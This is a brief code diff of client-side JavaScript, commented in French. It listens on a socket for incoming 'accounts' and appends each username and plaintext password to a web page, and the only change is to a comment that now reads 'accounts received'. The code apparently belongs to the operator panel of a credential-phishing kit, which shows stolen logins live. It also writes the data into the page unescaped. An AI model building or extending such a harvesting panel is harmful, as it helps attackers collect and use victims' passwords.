@@ -18,7 +18,7 @@ socket.on("users", (n) => {
     document.getElementById("users").innerText = n;
 });
 
-// comptes
+// comptes reçus
 socket.on("new_account", (data) => {
     document.getElementById("accounts").innerHTML +=
         `<p>${data.username} | ${data.password}</p><hr>`;
